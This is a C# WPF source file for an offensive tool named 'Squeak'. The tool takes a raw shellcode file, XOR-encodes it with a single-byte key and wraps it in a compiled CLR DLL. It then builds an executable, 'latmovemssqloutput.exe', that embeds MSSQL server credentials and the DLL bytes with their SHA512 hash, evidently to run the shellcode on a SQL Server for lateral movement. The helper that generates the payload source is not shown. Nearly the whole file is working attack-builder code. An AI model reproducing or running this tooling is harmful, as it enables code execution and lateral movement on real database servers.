using Microsoft.CSharp;
using Microsoft.Win32;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace Squeak
{
    /// <summary>
    /// Interaction logic for Home.xaml
    /// </summary>
    public partial class Home : Page
    {
        public Home()
        {
            InitializeComponent();
        }


        private void RtbDebug_TextChanged(object sender, EventArgs e)
        {
          
            // scroll it automatically
            rtbDebug.ScrollToEnd();
        }
        private void Generate_Click(object sender, RoutedEventArgs e)
        {
            rtbDebug.TextChanged += RtbDebug_TextChanged;
            
            string rawfile = "";
            string server = "";
            string port = "";
            string database = "";
            string username = "";
            string password = "";
            string outputfilename = "latmovemssqloutput.exe";
            string winauth = "false";

            try
            {
                rawfile = txtRaw.Text.Trim();
                server = txtServer.Text.Trim();
                port = txtPort.Text.Trim();
                database = txtDatabase.Text.Trim();
                username = txtUsername.Text.Trim();
                password = txtPassword.Text.Trim();
                if (cbWinauth.IsChecked == true)
                {
                    winauth = "TRUE";
                    username = "Windows Auth";
                    password = "blank";
                }

            }
            catch (Exception ex)
            {

                Environment.Exit(0);
            }
            rtbDebug.AppendText("\nStarting.");

            //Check the shellcode file is accessible
            try
            {
                File.ReadAllBytes(rawfile);

            }
            catch(Exception ex)
            {
                rtbDebug.AppendText("\nCould not read shellcode file");
                return;
            }

            //Grab the payload bytes and make the xored hex string
            byte[] key = new byte[] { 0xDE };
            byte[] shellcode = File.ReadAllBytes(rawfile);
            byte[] shellcodexor = exclusiveOR(shellcode, key);
            string hex = ByteArrayToString(shellcodexor);


            clsCode codeclass = new clsCode();
            //Generate the CLR DLL and read back in the hash/bytes
            string dllcode = codeclass.getdllcode(hex);
            string dllerrors = compileDLL(dllcode);
            
            if(dllerrors.Length > 2)
            {
                rtbDebug.AppendText("\nError compiling DLL: " + dllerrors);
                return;
            }
            byte[] dllbytes = File.ReadAllBytes("clrpoc.dll");
            string dllstring = "0x" + ByteArrayToStringFlat(dllbytes);
            string sha512hash = "0x" + hashdata(dllbytes);
            rtbDebug.AppendText("\nSha512 hash of DLL is " + sha512hash);



            string code = codeclass.getexecode(server, port, database, username, password, sha512hash, dllstring, winauth);

            try
            {
                string sqlerrors = compileMSSQL(code, outputfilename);
                if (sqlerrors.Length > 1)
                {
                    rtbDebug.AppendText("\nError compiling lat move exe: " + sqlerrors);
                }
                else
                {
                    rtbDebug.AppendText("\nYour exe has been written to: " + System.Environment.CurrentDirectory + @"\" + outputfilename);
                }
            }
            catch (Exception exc)
            {
                rtbDebug.AppendText("\nSomething went wrong: " + exc.Message);
            }
            
        }

     

        private void cbWinauth_CheckedChanged(object sender, RoutedEventArgs e)
        {
            if (cbWinauth.IsChecked == true)
            {
                txtUsername.IsEnabled = false;
                txtPassword.IsEnabled = false;
            }
            else
            {
                txtUsername.IsEnabled = true;
                txtPassword.IsEnabled = true;
            }
        }


        

        private static string hashdata(byte[] data)
        {
            byte[] bytes = new byte[] { };
            using (SHA512 shaM = new SHA512Managed())
            {
                bytes = shaM.ComputeHash(data);
            }
            // Convert byte array to a string   
            StringBuilder builder = new StringBuilder();
            for (int i = 0; i < bytes.Length; i++)
            {
                builder.Append(bytes[i].ToString("x2"));
            }
            return builder.ToString();

        }

        public static byte[] exclusiveOR(byte[] arr1, byte[] arr2)
        {


            byte[] result = new byte[arr1.Length];

            for (int i = 0; i < arr1.Length; ++i)
                result[i] = (byte)(arr1[i] ^ arr2[0]);

            return result;
        }

        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        public static string ByteArrayToStringFlat(byte[] ba)
        {
            
            StringBuilder builder = new StringBuilder();
            for (int i = 0; i < ba.Length; i++)
            {
                builder.Append(ba[i].ToString("x2"));
            }
            return builder.ToString();
        }



        private static string compileMSSQL(string code, string outputfilename)
        {
            string errors = "";
            var csc = new CSharpCodeProvider(new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } });
            var parameters = new CompilerParameters(new[] { "system.dll", "mscorlib.dll", "System.Core.dll", "System.Data.dll" }, outputfilename, false);
            parameters.GenerateExecutable = true;
            CompilerResults results = csc.CompileAssemblyFromSource(parameters, code);
            results.Errors.Cast<CompilerError>().ToList().ForEach(error => errors = errors + "\nLine " + error.Line + ": " + error.ErrorText);
            return errors;


        }

        private static string compileDLL(string code)
        {
            string errors = "";
            var csc = new CSharpCodeProvider(new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } });
            var parameters = new CompilerParameters(new[] { "system.dll", "mscorlib.dll", "System.Core.dll", "System.Data.dll" }, "clrpoc.dll", false);
            parameters.GenerateExecutable = false;
            CompilerResults results = csc.CompileAssemblyFromSource(parameters, code);
            results.Errors.Cast<CompilerError>().ToList().ForEach(error => errors = errors + "\nLine " + error.Line + ": " + error.ErrorText);
            return errors;
        }

        private void btnFileBrowse_Click(object sender, EventArgs e)
        {
            
            OpenFileDialog openFileDialog = new OpenFileDialog();
            if (openFileDialog.ShowDialog() == true)
                txtRaw.Text = openFileDialog.FileName;

        }

        private void CodeEdit_Click(object sender, RoutedEventArgs e)
        {
           
            Code codepage = new Code();
            this.NavigationService.Navigate(codepage);
        }
    }
}

